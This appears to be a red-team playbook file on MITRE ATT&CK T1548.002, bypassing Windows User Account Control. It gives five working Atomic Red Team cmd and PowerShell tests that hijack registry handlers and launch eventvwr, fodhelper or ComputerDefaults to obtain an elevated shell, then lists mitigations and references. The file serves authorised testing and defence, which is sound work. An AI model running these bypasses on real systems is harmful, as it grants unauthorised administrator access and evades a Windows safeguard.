---
name: "T1548.002_bypass-user-account-control"
description: "Adversaries may bypass UAC mechanisms to elevate process privileges on system."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1548.002
  - privilege-escalation
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1548.002"
tactic: "privilege-escalation"
all_tactics:
  - privilege-escalation
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1548/002"
tech_stack:
  - windows
cwe_ids:
  - CWE-269
chains_with:
  - T1548
  - T1548.001
  - T1548.003
  - T1548.004
  - T1548.005
  - T1548.006
prerequisites:
  - T1548
severity_boost:
  T1548: "Chain with T1548 for deeper attack path"
  T1548.001: "Chain with T1548.001 for deeper attack path"
  T1548.003: "Chain with T1548.003 for deeper attack path"
---

# T1548.002 Bypass User Account Control

> **Sub-technique of:** T1548

## High-Level Description

Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

- <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.

## Kill Chain Phase

- Privilege Escalation (TA0004)
- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Bypass User Account Control technique is applicable to target environment
- [ ] Check Windows systems for indicators of Bypass User Account Control
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Bypass UAC using Event Viewer (cmd)

Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privileges.

**Supported Platforms:** windows

```cmd
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
cmd.exe /c eventvwr.msc
```

### Atomic Test 2: Bypass UAC using Event Viewer (PowerShell)

PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privalages

**Supported Platforms:** windows

```powershell
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"
```

### Atomic Test 3: Bypass UAC using Fodhelper

Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.

**Supported Platforms:** windows

```cmd
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe
```

### Atomic Test 4: Bypass UAC using Fodhelper - PowerShell

PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution command prompt will be opened.

**Supported Platforms:** windows

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### Atomic Test 5: Bypass UAC using ComputerDefaults (PowerShell)

PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
Upon execution administrative command prompt should open

**Supported Platforms:** windows

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Bypass User Account Control by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1548.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1051 Update Software

Consider updating Windows to the latest version and patch level to utilize the latest protective measures against UAC bypass.

### M1047 Audit

Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.

### M1052 User Account Control

Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL.

### M1026 Privileged Account Management

Remove users from the local administrator group on systems.

## Detection

### Detection Strategy for T1548.002 – Bypass User Account Control (UAC)

## Risk Assessment

| Finding                                          | Severity | Impact               |
| ------------------------------------------------ | -------- | -------------------- |
| Bypass User Account Control technique applicable | High     | Privilege Escalation |

## CWE Categories

| CWE ID  | Title                         |
| ------- | ----------------------------- |
| CWE-269 | Improper Privilege Management |

## References

- [Davidson Windows](http://www.pretentiousname.com/misc/win7_uac_whitelist2.html)
- [TechNet How UAC Works](https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works)
- [SANS UAC Bypass](http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass)
- [MSDN COM Elevation](https://msdn.microsoft.com/en-us/library/ms679687.aspx)
- [enigma0x3 Fileless UAC Bypass](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
- [enigma0x3 sdclt app paths](https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/)
- [enigma0x3 sdclt bypass](https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)
- [TechNet Inside UAC](https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx)
- [Fortinet Fareit](https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware)
- [Github UACMe](https://github.com/hfiref0x/UACME)
- [Atomic Red Team - T1548.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1548.002)
- [MITRE ATT&CK - T1548.002](https://attack.mitre.org/techniques/T1548/002)
